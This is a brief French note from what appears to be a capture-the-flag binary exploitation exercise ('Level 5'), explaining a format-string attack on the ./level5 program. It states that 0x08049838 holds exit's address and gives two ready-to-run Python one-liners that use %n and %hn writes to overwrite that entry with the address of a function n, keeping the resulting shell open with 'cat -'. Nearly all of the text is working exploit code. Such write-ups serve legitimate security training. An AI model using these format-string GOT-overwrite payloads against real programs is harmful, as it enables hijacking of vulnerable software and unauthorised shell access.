# Level 5

"\x38\x98\x04\x08" est une addresse qui tiens `exit` comme valeur.
"0x80484a4 - 4 " est l'addresse de n - 4 pour enlever les 4 octet de l'addresse d'exit
(python -c 'print("\x38\x98\x04\x08"+"%"+str(0x80484a4 - 4)+"d%4$n")'; cat -) | ./level5
python -c 'print("\x3A\x98\x04\x08\x38\x98\x04\x08%2044x%4$hn%31904x%5$hn")' > /tmp/test ;cat /tmp/test - | ./level5
